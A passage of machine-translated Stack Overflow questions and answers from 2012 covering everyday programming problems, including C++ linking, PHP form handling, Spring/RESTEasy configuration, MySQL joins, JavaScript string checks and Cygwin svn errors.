我已经搜索了该站点，但还没有找到问题的答案。使用 ranlib 根本没有帮助，还尝试将 -m32 提供给我的编译器，但仍然无济于事。我尝试了三台不同的机器，都失败了。

Franky，我正在考虑删除整个归档文件，更新 makefile 并链接到目标文件，但我真的很想知道这里发生了什么，并在此过程中学到一些东西。

我预计会丢失很多信息，所以为了以防万一，我上传了一个包含整个内容的 .tar.gz 文件（只需解压缩并尝试生成文件）。为了您的阅读，所有的 .o 文件都将位于 objects 目录中，并且使用的每个命令都可以在 makefile 中读取。另外，main 应该在屏幕上显示一些无脑的东西（可能是红色方块，因为资源文件没有上传以节省空间，当然，.o 和 .a 文件也被排除在外）。

可以[在此链接中](http://www.caballorenoir.net/hosted/motor_grafico.tar.gz)访问该文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T09:29:43.433

再次阅读您的问题并检查存档，您只有头文件中的代码吗？但是你不能创建一个库！头文件用于包含在源文件中，而不是编译为目标文件！

将标头拆分为仅包含声明的正确头文件，并将定义（即实现）放入源文件中。将源文件编译为用于创建库的目标文件。

如果没有“实现”并且所有代码都内联在头文件中，则无需制作库，只需包含所需的头文件即可。

# php - 检查 xml 是否存在（simplexml_load_file）

> ID：11820471
> 
> 赞同：1
> 
> 时间：2012-08-05T22:09:28.720
> 
> 标签：php

我正在读取一个数字的 XML 文件。然后，它使用该数字作为 URL 参数，该参数也可用作 XML。在少数情况下 XML 不存在。发生这种情况时，我希望页面报告该游戏没有统计信息。

TL;DR：如果 XML 不存在，我怎样才能让它简单地回显“No Stats”。

```
$gamepage = simplexml_load_file('' . rawurlencode($gamelink) . '?xml=1'); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-05T22:35:57.530

```
$a = simplexml_load_string($somestring);
if($a===FALSE) {
   echo 'No Stats';
} else {
   echo "Valid XML found... processing."; 
} 
```

像馅饼一样简单。

# c# - 我正在尝试从另一个类中的方法调用具有构造函数的类

> ID：11820472
> 
> 赞同：0
> 
> 时间：2012-08-05T22:09:35.007
> 
> 标签：c#

我试图从另一个类调用构造函数，因为我试图保持 OOP 标准，现在我无法从构造函数中取回值。

构造函数：

```
namespace ContactForm.ContactFiles
{
   class Contact
   {

     //First name
     private string m_fName;
     //Last name
     private string m_lName;

     public Contact()
     {
     }

     public Contact(string FirstName)
         : this(FirstName, string.Empty)
     {
     }       

     public Contact(string FirstName, string LastName)
     {
         m_fName = FirstName;
         m_lName = LastName;
     }   

     public string Firstname
     {
         //First name
         get { return m_fName; }

         set { m_fName = value; }
     }

     public string Lastname
     {
         get { return m_lName; }

         set { m_lName = value; }
     }

     public string GetToStringItemsHeadings
     {
         get { return string.Format("{0,-20} {1, -20}", "First Name", "Last Name"); }
     }

     public override string ToString()
     {
         string strOut = string.Format("{0,-20} {1, -20}", m_fName, m_lName);
         return strOut;
     }         
} 
```

我想将 button_klick 的 Form(txtboxes) 中给出的值发送到另一个类中的此构造函数中，我需要获取该 strOut 以便我可以使用它并将其放入 List 并在另一个中呈现带有列表框的表单。从而保持它符合 OOP 标准，?。如果有更好的方法来做到这一点，我对所有人和任何想法都持开放态度，因为这对我来说是一种新的想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:31:57.087

单击按钮时，创建类的一个实例，并从构造函数传递值：

```
var oContact = new Contact(txtFirstName.Text, txtLastName.Text); 
```

那么你可以通过

```
oContact.ToString() 
```

或整个对象到任何代码需要使用它。

# groovy - 如何在 GEB 弹出确认窗口中按“y”？

> ID：11820475
> 
> 赞同：0
> 
> 时间：2012-08-05T22:09:48.447
> 
> 标签：groovy, geb

我正在尝试自动化文件下载功能。单击 PDF 的链接时，会弹出下载确认窗口。如何编写geb代码以通过GEB脚本在弹出窗口中的（Y / N）选择中单击Y？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-03-13T20:52:44.447

使用 withConfirm(true) 将通过单击确定绕过确认框。$() 是负责对话框的按钮的 Jquery 元素。.click() 进行点击

```
withConfirm(true) { $("Element responsible for download").click() } 
```

# spring - Autowired 不适用于 RESTEasy 和 Spring 3

> ID：11820476
> 
> 赞同：3
> 
> 时间：2012-08-05T22:10:07.300
> 
> 标签：spring, jax-rs, resteasy, autowired

我在将@Autowired 与 RESTEasy 2.2.1.GA 和 Spring 3.0.5.RELEASE 一起使用时遇到了麻烦。我总是在

```
String result = customerBo.getMsg(); 
```

为我服务。

如何纠正我的代码的自动装配行为？

这是我的 RESTEasy 服务：

```
@Component
@Path("/api")
public class Rest {

    @Autowired
    CustomerBo customerBo;

      @GET
      @Produces("text/plain")
      public String getXMLMessage() {
              String result = customerBo.getMsg();
              return result;
      }
} 
```

这是我的 web.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app version="2.5" xmlns="http://java.sun.com/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">

    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>
            /WEB-INF/spring/root-context.xml
        </param-value>
    </context-param>

    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>

    <!-- JBoss RESTEasy -->
    <context-param>
        <param-name>resteasy.resources</param-name>
        <param-value>ua.softserve.hotel.api.Rest</param-value>
    </context-param>

    <listener>
        <listener-class>
            org.jboss.resteasy.plugins.server.servlet.ResteasyBootstrap
        </listener-class>
    </listener>

    <servlet>
        <servlet-name>resteasy-servlet</servlet-name>
        <servlet-class>
            org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher
        </servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>resteasy-servlet</servlet-name>
        <url-pattern>/api</url-pattern>
    </servlet-mapping>
    <!-- JBoss RESTEasy end -->

    <servlet>
        <servlet-name>appServlet</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>/WEB-INF/spring/appServlet/servlet-context.xml</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>appServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

    <filter>
        <filter-name>charsetFilter</filter-name>
        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
        <init-param>
            <param-name>encoding</param-name>
            <param-value>UTF-8</param-value>
        </init-param>
        <init-param>
            <param-name>forceEncoding</param-name>
            <param-value>true</param-value>
        </init-param>
    </filter>
    <filter-mapping>
        <filter-name>charsetFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

    <filter>
        <filter-name>springSecurityFilterChain</filter-name>
        <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>springSecurityFilterChain</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

</web-app> 
```

这是我的 root-context.xml：

```
<?xml  version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:aop="http://www.springframework.org/schema/aop"
    xmlns:context="http://www.springframework.org/schema/context"
    xmlns:jee="http://www.springframework.org/schema/jee" xmlns:lang="http://www.springframework.org/schema/lang"
    xmlns:p="http://www.springframework.org/schema/p" xmlns:tx="http://www.springframework.org/schema/tx"
    xmlns:util="http://www.springframework.org/schema/util"
    xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd
        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee.xsd
        http://www.springframework.org/schema/lang http://www.springframework.org/schema/lang/spring-lang.xsd
        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd
        http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">

    <!-- Root Context:   -->

    <context:annotation-config />

    <bean id="customerBo" class="ua.softserve.hotel.api.CustomerBoImpl">
    </bean>

    <context:component-scan base-package="ua.softserve.hotel" />

    <import resource="data.xml" />
    <import resource="security.xml" />

</beans> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T16:34:44.940

我的问题解决了。问题在于，对于实现，我使用了来自不同来源的文章，用于不同版本的库。

我在官方文档中找到的问题的正确答案：http: [//docs.jboss.org/resteasy/docs/2.2.1.GA/userguide/html/RESTEasy_Spring_Integration.html](http://docs.jboss.org/resteasy/docs/2.2.1.GA/userguide/html/RESTEasy_Spring_Integration.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-23T05:11:26.057

根据文档，SpringContextLoaderListener 必须在 ResteasyBootstrap 之后声明，因为它使用由它初始化的 ServletContext 属性。

org.jboss.resteasy.plugins.server.servlet.ResteasyBootstrap

org.jboss.resteasy.plugins.spring.SpringContextLoaderListener

# javascript - 如何检查 url 是否包含多个字符串。Javascript/jQuery

> ID：11820480
> 
> 赞同：1
> 
> 时间：2012-08-05T22:10:35.717
> 
> 标签：javascript, jquery, url

在[如何检查 url 是否包含给定字符串的问题中。Javascript/jquery](https://stackoverflow.com/questions/4597050/how-to-check-if-the-url-contains-a-given-string-javascript-jquery) 答案检查 url 是否包含给定的字符串。我想扩展它以检查它是否包含两个东西 name=franky && gender=male。我试过

```
if(window.location.href.indexOf("name=franky" && "gender=male") > -1) 
```

最初似乎有效，但经过进一步测试，我发现如果只有姓名或性别之一存在，它似乎有效。我在哪里错了？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T22:12:55.090

您可以将其分成两部分并调用 indexOf 两次，而不是尝试在同一个调用中检查两个字符串。像这样的东西：

```
if(window.location.href.indexOf("name=franky") > -1 && 
    window.location.href.indexOf("gender=male") > -1) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-05T22:30:29.453

该`.indexOf()`函数仅查找单个字符串。要测试两个字符串，您需要`.indexOf()`根据 Christofer 的回答两次调用：

```
if(window.location.href.indexOf("name=franky") > -1 && 
   window.location.href.indexOf("gender=male") > -1) 
```

我发布答案的原因也是为了简要解释`&&`运算符的工作原理：给定`expr1 && expr2`，[`&&`运算符](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/Logical_Operators#Summary) *“* `expr1` *如果可以转换为 false，则返回；否则，返回* `expr2`。”

“转换为假”是什么意思？基本上`null`, `undefined`, `0`, `NaN`and `""`(empty string) 是“假的”，将被“转换为假”。非零数字、非空字符串和任何对象都是“真实的”，并将被转换为真实。

这意味着当您说操作员测试`"name=franky" && "gender=male"`第`&&`一个操作数时，发现（在这种情况下）它*不能*转换为 false，所以它返回`"gender=male"`. 所以你的代码在某些时候似乎工作的原因是它实际上是这样做的：

```
if(window.location.href.indexOf("gender=male") > -1) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-05T22:37:01.357

另一种通用方法

```
function CheckIfAllQueryStringsExist(url, qsCollection) {
    for (var i = 0; i < qsCollection.length; i++) {
        if (url.indexOf(qsCollection[i]) == -1) {
            return false;
        }
    }
    return true;
} 
```

像这样称呼它。

```
var myUrl = window.location.href;
var queryStrings = ["name=franky", "gender=male"];
var allPresent = CheckIfAllQueryStringsExist(myUrl, queryStrings); 
```

# c++ - C ++如何设置std :: vector类型的指针 到 std::vector 类型的对象

> ID：11820490
> 
> 赞同：1
> 
> 时间：2012-08-05T22:12:14.123
> 
> 标签：c++, polymorphism, static-cast

的背景：

我正在用 C++ 构建一个物理引擎，它计算笛卡尔空间中 n 体系统的引力演化，然后将其转换为任何预定义的坐标系。最终目标是使起始坐标系任意（在坐标系“n”中计算，而不仅仅是笛卡尔坐标系），但这是一个遥远的目标。

问题：

因为坐标系应该是可互换的，所以我让笛卡尔坐标系扩展了一个基本坐标系：

```
class CoordMember {
}

class CoordState {
   public:
      /* methods to operate on members */

   protected:
      std::vector<CoordMember*> members;
}

class Particle : public CoordMember {
}

class CartState : public CoordState {
} 
```

尝试创建指向类型`std::vector<Particle*>`成员对象的类型指针时会出现错误`std::vector<CoordMember*>`：

```
CartState* state = new CartState(/* initialization vars */);
std::vector<Particle*>* parts = static_cast< std::vector<Particle*>* >(&state->members); 
```

编译器错误是：

```
error: static_cast from 'std::vector<CoordMember *> *' to 'std::vector<Particle *> *' is not allowed
error: no viable overloaded '=' 
```

在这一点上，我知道其中的数据`state->members`都是 type的事实`Particle*`。我不知道要做什么才能使这个演员成为可能。有任何想法吗？

tl;博士：

```
std::vector<Derived*>* ptr = static_cast< std::vector<Base*>* >(&object);
static_cast from 'std::vector<Derived*>*' to 'std::vector<Base*>*' is not allowed 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T22:14:47.320

演员表不起作用，因为`vector`s**完全不相关**。您必须将每个单独的对象投射到向量中。

# mysql - MYSQL - 仅当两个表都有条目时才显示结果

> ID：11820492
> 
> 赞同：0
> 
> 时间：2012-08-05T22:12:30.880
> 
> 标签：mysql, sql

我有两个表： `Tracking`和`Files`。

*   Tracking 包含很多以 track_id 作为主键的字段。
*   Files 包含一个file_id、track_id、filename 和approved。

这`track_id`显然是将文件记录链接回跟踪记录。可以是同一track_id的多个文件记录

我需要做的是显示跟踪中的所有记录的列表，其中包含未批准的文件。

现在为了测试，我有一个跟踪记录，其中有 3 个与之关联的文件。我的想法是使用 Left Join 和以下语句：

```
 SELECT * 
     FROM tracking 
LEFT JOIN files ON tracking.track_id = files.track_id 
    WHERE (tracking.archived = '0' AND approved = '0') 
 ORDER BY tracking.po_number; 
```

但是，这会将相同的记录返回给我 3 次。我想我需要在某个地方添加一个独特的子句，但是我认为它应该去的每个地方都会给我一个 SQL 语句错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:17:14.113

如果您只想匹配两个表中都存在的 id，则应该使用内部联接。为避免重复，请使用 distinct

```
 SELECT distinct [list of columns] 
 FROM tracking, files 
 WHERE tracking.track_id = files.track_id  AND 
       tracking.archived = '0' AND approved = '0'
 ORDER BY tracking.po_number; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T22:25:23.173

```
SELECT    a.*
FROM      tracking a
JOIN      (
          SELECT   track_id
          FROM     files
          WHERE    approved = 0
          GROUP BY track_id
          ) b ON a.track_id = b.track_id
WHERE     a.archived = 0
ORDER BY  a.po_number 
```

# php - PHP注册脚本不工作

> ID：11820494
> 
> 赞同：0
> 
> 时间：2012-08-05T22:12:40.783
> 
> 标签：php, mysql, registration, die

我编写了一个运行良好的 PHP 注册/登录系统。但是，我尝试添加一些服务器端错误检查，以防止用户在不输入密码的情况下进行注册，检查密码字段是否匹配等。这是我的代码：

```
<?php

session_start();

// retrieve data via POST

$username = $_POST['username'];
$pass1 = $_POST['pass1'];
$pass2 = $_POST['pass2'];
$userLoc = $_POST['userLoc']; // user location is a field on the submitted form

include("config.php");

$username = mysqli_real_escape_string($conn, $username); // clean username input

// ensure that the two password fields match
if ($pass1 != $pass2) {
    header('Location: ../');
    die();
}

// ensure that the user didn't bypass  maxlength for username
if(strlen($username) > 30) {
    header('Location: ../');
    die();
}

// ensure that the user actually entered a password
if( strlen($pass1<3) || strlen($pass2<3) ) {
    header('Location: ../');
    die();
}

// check if username already taken
// I'm using a session variable that causes a div to be displayed on index.php to indicate username taken
// (I also have AJAX username check already implemented)

$query = "SELECT 1 FROM users WHERE username='$username'";
$result = mysqli_query($conn,$query);
if ( $result && mysqli_num_rows($result) > 0 ) {
    $_SESSION['usernameTaken'] = 1;
    header('Location: ../');
}

// create hash for password
$hash = hash('sha256', $pass1);

// create salt for password
function createSalt()
{
    $string = md5(uniqid(rand(), true));
    return substr($string, 0, 3);
}

$salt = createSalt();
$hash = hash('sha256', $salt . $hash);

$userLoc = mysqli_real_escape_string($conn, $userLoc);
$query = "INSERT INTO users ( username, password, salt, userLoc ) VALUES ( '$username' , '$hash' , '$salt' , '$userLoc' );";
mysqli_query($conn,$query);
mysqli_close();

header('Location: ../');

?> 
```

这是我无法弄清楚的问题：使用那里的`die();`语句，如果满足任何条件（密码不匹配，用户名已经存在等），脚本实际上会自行终止，它被正确重定向到 index.php( `../`)，并且用户名没有添加到数据库中。然而，即使没有触发任何错误检查逻辑（换句话说，用户名可用，密码匹配等），用户名也不会被添加到数据库中。我能够将任何内容添加到数据库的唯一方法是删除每个`die()`语句，但这使得错误检查不起作用（例如，我可以输入不匹配的密码，并且用户名仍然会与散列一起添加到数据库中`pass1`）。

我认为这是因为`die()`即使给定的`if`语句没有评估为真，语句也会被触发。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:24:31.567

要查看您是否遇到 MySQL 错误，请将此代码放在`INSERT`查询之后。

```
printf("Errormessage: %s\n", $mysqli->error); 
```

如果这不起作用，我*强烈*建议您将消息放在您的`die()`行内，因为这样您就知道错误出现的确切位置。像这样做：

`die('This error happened!');`

如果您在每个 中都有唯一的消息`die()`，您可以判断代码的哪一部分导致它停止 - 如果有的话。

最后，在脚本的底部放置类似`echo "FINISHED!";`的内容，这样您就可以查看脚本是否一直执行。

上述错误查找方法的组合应该为您指明正确的方向，以找出问题所在。

祝你好运！

# c++ - C++ inet_ntoa 导致分段错误

> ID：11820498
> 
> 赞同：0
> 
> 时间：2012-08-05T22:13:29.753
> 
> 标签：c++, unix, g++

inet_ntoa() 函数在以下代码中导致分段错误错误。请告诉我，为什么。我该如何解决？非常感谢！

```
void ClientAdd ( int clientSocket )
{
    sockaddr            clientAddress;
    socklen_t           clientAddressLength;
    sockaddr_in*        clientAddressInternet;
    char*               clientHost;

    getpeername ( clientSocket , &clientAddress , &clientAddressLength );
    clientAddressInternet = (struct sockaddr_in*)&clientAddress;
    clientHost = inet_ntoa ( clientAddressInternet->sin_addr );
}; 
```

我认为这都是关于 inet_ntoa 的返回值。但是不知道怎么查。。。

PS 用 g++@debian 编译

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T05:35:40.543

`getpeername`期望传递两个指向内存的指针，它可以在其中写入客户端地址和客户端地址长度。所以你的原始代码

```
sockaddr*            clientAddress;
socklen_t*           clientAddressLength;

getpeername ( clientSocket , clientAddress , clientAddressLength ); 
```

是错误的，因为这两个指针`clientAddress`和`clientAddressLength`未初始化。这些指针将指向内存中的某个任意位置，并且写入它们可能会导致程序崩溃，如果不是立即然后不久之后。正确调用的最简单方法`getpeername`是声明两个变量，而不是两个指针，然后使用地址运算符 '&' 将这些变量的地址传递给`getpeername`. 像这样

```
sockaddr            clientAddress;
socklen_t           clientAddressLength;

getpeername ( clientSocket , &clientAddress , &clientAddressLength ); 
```

# php - 特定表格行周围的边框

> ID：11820499
> 
> 赞同：0
> 
> 时间：2012-08-05T22:13:29.520
> 
> 标签：php, html, css, html-table, border

我正在尝试仅在顶行周围创建边框！目前，边框将仅显示在表格的外部。但我也想要第一行周围的边框。有人可以帮我这样做吗？我希望带有“团队、正确选择和积分”的行周围有一个边框。

```
<body>
    <?=$leaguename?>
    <center><table cellspacing="0" style="width:400px; border:1px solid gray">
    <?
    echo "<tr border=\"1\"><td> Team </td><td>Correct Picks</td><td>Points</td></tr>";
    while($row = mysql_fetch_array($memberslist)) {
        if ($row['User_ID'] == $id) {
            echo "<tr style=\"border:1px solid gray\" bgcolor=\"gray\"><td>" . $row['User_ID'] . "</td><td><b>" . $row['Correct_Picks'] . " </b> /" . $maxcorrectpicks . "</td><td>" . $row['Points'] . "</td></tr>";
        } else {
            echo "<tr><td>" . $row['User_ID'] . "</td><td><b>" . $row['Correct_Picks'] . " </b> /" . $maxcorrectpicks . "</td><td>" . $row['Points'] . "</td></tr>";
    }
    }
    ?>
    </table></center>

</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:37:34.353

这是展示性的，因此将其混入 PHP 是一个坏主意。相反，使用 CSS：

```
tr:first-child td { border-top: 1px solid black; border-bottom: 1px solid black; }
tr:first-child td:first-child { border-left:1px solid black; }
tr:first-child td:last-child { border-right:1px solid black; } 
```

IE7+8 对 *-child 选择器的支持可能有点问题。如果它在这些浏览器中不起作用，请考虑使用 JavaScript polyfills。

您可能还希望将标题`<thead>`和`<th>`元素放入其中，以使`<tr>`带有数据的数据成为元素中的第一行`<tbody>`。

例如

```
<table>
  <thead>
    <tr>
      <th>Team</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
    </tr>
  </tbody>
</table> 
```

# java - Java如何在运行时重载类

> ID：11820502
> 
> 赞同：0
> 
> 时间：2012-08-05T22:13:44.247
> 
> 标签：java, class, runtime, overloading

可以手动将修改后的类添加到 jar 文件中，但为了简单起见，我想在运行时进行。

让我们这样说：

> JAR_A.jar - 包含 A.class 和 B.class
> 
> JAR_B.jar - 包含 B.class 的修改版本

我不想使用存档管理器手动添加修改后的 B.class，而是希望在运行时完成相同的操作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:21:37.167

[http://www.java2s.com/Code/Java/File-Input-Output/CreateJarfile.htm](http://www.java2s.com/Code/Java/File-Input-Output/CreateJarfile.htm)

```
 FileOutputStream fout = new FileOutputStream("c:/tmp/foo.jar");
 JarOutputStream jarOut = new JarOutputStream(fout);
 jarOut.putNextEntry(new ZipEntry("com/foo/")); // Folders must end with "/".
 jarOut.putNextEntry(new ZipEntry("com/foo/Foo.class"));
 jarOut.write(getBytes("com/foo/Foo.class"));
 jarOut.closeEntry();
 jarOut.putNextEntry(new ZipEntry("com/foo/Bar.class"));
 jarOut.write(getBytes("com/foo/Bar.class"));
 jarOut.closeEntry();
 jarOut.close();
 fout.close(); 
```

# java - 如何在 Java 中为每个方法分配角色并设置权限？

> ID：11820503
> 
> 赞同：0
> 
> 时间：2012-08-05T22:13:53.233
> 
> 标签：java, sql

我正在为计算机实验室管理系统开发一个应用程序，这是我的任务。我正在使用 SQL Server 编写 SQL 脚本并管理我的数据库，我使用 netbeans 编写 Java 源代码并通过 JDBC 与 SQL Server 交互。

我想为我的应用程序中的每个方法设置角色并设置权限。示例：管理员可以查看/添加/编辑/删除用户用户只能查看记录。

管理员可以使用 void view()、add()、edit()、remove。但是，void view() 只能由用户使用，用户不能使用方法：add()、edit()。我尝试搜索，阅读一些书，寻找一些文章来解决我的问题。但是，......我没有找到任何文章！

感谢您的阅读！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T15:52:13.797

由于 Admin、User 等是角色而不是显式用户，我建议使用角色模式。这里有一个小例子：

```
class User{
UserRole role;
//other user concerning stuff
}  

abstract class UserRole{
//eg. every User has at least the View Permission    
abstract void view();
//If the view() Operation should behave the way for every role, implement it right here
}

class AdminRole extends UserRole{
   public void add(){}
   public void view(){}
   public void edit(){}
   public void remove(){}
}

class EditRole extends UserRole{
   public void view(){}
   public void edit(){}
} 
```

这样您就可以隔离用户及其权限，并且可以在运行时更改角色。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:44:47.527

好吧，您不能在方法上定义“权限”。您可以改为使用 OOP 来表示您的域的对象。每个对象都可以代表您的权限系统中的一个实体，实现它应该被允许使用的方法。

例如：

```
class Admin
{
   public void Add(){}
   public void View(){}
   public void Edit(){}
   public void Remove(){}
}

class User
{
   public void View(){}

} 
```

就像其他人指出的那样，这主要是一个设计问题。之前提出的过于简单的解决方案不能很好地扩展:)（如果您需要动态更改权限怎么办？如果应该将不同的权限授予不同的用户怎么办？）

这当然取决于作业的复杂性和要求。如果您需要更优雅、更灵活的解决方案来管理权限，您可以查看[RBAC](http://en.wikipedia.org/wiki/Role-based_access_control)（基于角色的访问控制）。

请注意，我的不是一个真正的答案，只是一些提示。无论如何希望对您有所帮助。

# soundcloud - Soundcloud API：如何只播放曲目的一部分？

> ID：11820504
> 
> 赞同：1
> 
> 时间：2012-08-05T22:14:07.283
> 
> 标签：soundcloud

对于即将到来的项目，我正在研究使用 Soundcloud API 仅播放特定长度（例如 20 秒）的曲目的可能性。

如果可能的话，有人可以告诉我，还是应该单独创建一个长度有限的不同轨道？

非常感谢 ！马丁 (WebForDreams)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T19:10:03.537

有几种方法可以做到这一点。您打算使用 JavaScript SDK 还是播放器小部件？对于播放器小部件，您可以只使用[seekTo()](http://developers.soundcloud.com/docs/widget#methods)。

如果您使用的是 JavaScript SDK，您可以使用[setPosition()](http://www.schillmania.com/projects/soundmanager2/doc/#soundmanager-setposition)方法：

```
SC.initialize({
  client_id: 'foo'
});
SC.whenStreamingReady(function() {
  var sound = SC.stream(52933447);
  sound.setPosition(2000); // position, measured in milliseconds
  sound.play();
}); 
```

如果您想停在某个特定点，可以使用[onPosition()](http://www.schillmania.com/projects/soundmanager2/doc/#smsound-onposition)。

希望有帮助！

# .net - 匹配字符串的开头

> ID：11820512
> 
> 赞同：1
> 
> 时间：2012-08-05T22:14:50.097
> 
> 标签：.net, regex

我有一些`"paths"`格式类似于：

```
/Media/Default/images/Tulips.jpg 
```

而且我有能力获得“根路径”，它将返回类似于以下内容的内容：

```
http://example.com/Media/Default/
/another-prefix/Media/Default/ 
```

我需要做的是将“路径”字符串的开头与“根路径”字符串的结尾匹配以返回`images/Tulips.jpg`

我真正需要的是一个通用的正则表达式，它将比较 2`strings`做一个`sort`覆盖和修剪以最大可能的匹配。这样，如果输入更改为：

> 路径：qwerty-some-random-string
> 
> 根路径：junk-qwerty
> 
> 结果：-一些随机字符串

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:17:02.827

### 正确的解决方案（使用 LINQ）

`root`按长度的降序尝试所有后缀，并在确定其中一个是 的前缀时停止`path`：

```
var path = "qwerty-qwerty-some-random-string";
var root = "aardvark-junk-qwerty-qwerty";

var prefix = root.Select((ch, i) => root.Substring(i))
                 .Where(pref => path.StartsWith(pref))
                 .DefaultIfEmpty("")
                 .First();
var result = path.Substring(prefix.Length); 
```

**[看到它在行动](http://ideone.com/oLR1B)**。

* * *

注意：最初我在这里发布了一个正则表达式解决方案，但结果证明它完全不可行。

# php - 如何使用电子邮件表单发送图像

> ID：11820514
> 
> 赞同：0
> 
> 时间：2012-08-05T22:14:55.100
> 
> 标签：php, forms

我有一个经典表单和一个上传图像输入，允许访问者输入详细信息和一个图像。

```
<input type="text" id="first_name" name="first_name" maxlength="50">
<input type="file" id="image" name="image"> 
```

目前我将图像存储在客户端服务器上，仅将图像 URL 发送到客户端电子邮件，但最近该文件夹达到了 10MB 的限制，无法再上传图像，进一步的电子邮件也提交失败。
我尝试了很长时间以某种方式将带有上传图像的表单发送到客户端电子邮件，而不将其存储在服务器端但没有成功。谷歌搜索并尝试了很多建议 - 我只能发送表格但没有附加图像。我能做些什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:19:39.053

如果不先将文件存储在服务器上，就无法将文件附加到电子邮件中。

您可以考虑使用[Amazon S3](http://aws.amazon.com/s3/)等服务来托管文件。这样，您不必处理文件，仍然可以通过电子邮件发送 URL，这让每个人都更开心。

或者，您可能能够找到提供 API 以将图片上传到的服务，例如[ImageShack 。](http://code.google.com/p/imageshackapi/)

祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T22:52:15.160

当您提交表单并在电子邮件中使用该数据时，您应该能够使用 tmp 位置使用 file_get_contents($image) 获取图像的二进制内容。根据您是否使用 html 电子邮件，在电子邮件中显示的方法会有所不同。

此链接可能有助于 [php: recreate and display an image from binary data](https://stackoverflow.com/questions/2070603/php-recreate-and-display-an-image-from-binary-data)

# geo - 如何编写将您的地理位置发布到网站的脚本？

> ID：11820515
> 
> 赞同：1
> 
> 时间：2012-08-05T22:15:21.340
> 
> 标签：geo

这几天到处都能看到...

Facebook 将显示您的地理位置以及您的状态更新。“John Doe 这么说……德克萨斯州奥斯汀附近”

在谷歌地图中，​​您可以单击“圆点”，它会显示您的地理位置，并允许您围绕该位置创建方向。

它背后的编码是什么？我想开始在一些事情中实现这一点（更重要的是 facebook 是如何做到的）。有人有想法吗？我猜测 php、javascript、数据库（ajax）和某种“GEO api”之间的组合......以及一些不错的时尚 html/css。

我在正确的思路上吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:42:58.390

这是地理定位 API。看看这里：[http ://html5doctor.com/finding-your-position-with-geolocation/](http://html5doctor.com/finding-your-position-with-geolocation/)

# svn - Cygwin svn 和 sqlite：“磁盘 I/O 错误”

> ID：11820519
> 
> 赞同：1
> 
> 时间：2012-08-05T22:15:47.040
> 
> 标签：svn, sqlite, cygwin

> **可能重复：**
> [cygwin svn：E200030：sqlite：磁盘 I/O 错误](https://stackoverflow.com/questions/11007024/cygwin-svn-e200030-sqlite-disk-i-o-error)

在我的带有 SSD 的 Win7 机器上的 Cygwin 中，svn 经常无法完全更新或签入。它打印

`sqlite: disk I/O error`

对于目标目录的子集。

[（这与这个问题](https://stackoverflow.com/questions/11007024/cygwin-svn-e200030-sqlite-disk-i-o-error)中的症状相同 ，但我没有安装 TortoiseSVN，也没有运行防病毒软件。）

这个问题显然可以通过 Cygwin 的 setup.exe 将 sqlite 从 3.7.12 降级到 3.7.3 来解决，但我无法做到这一点。当我尝试时，svn 给了我

`SQLite compiled for 3.7.12 but running with 3.7.3`.

我尝试通过 setup.exe 卸载 svn 和 sqlite，然后安装 SQLite 3.7.3 以及 Prev 和 Curr 的 subversion，结果相同。

**如何让 svn 与 SQLite 的工作版本一起运行？**

# ios - 在 iOS 中使用 CIEdgeWork 过滤器

> ID：11820520
> 
> 赞同：1
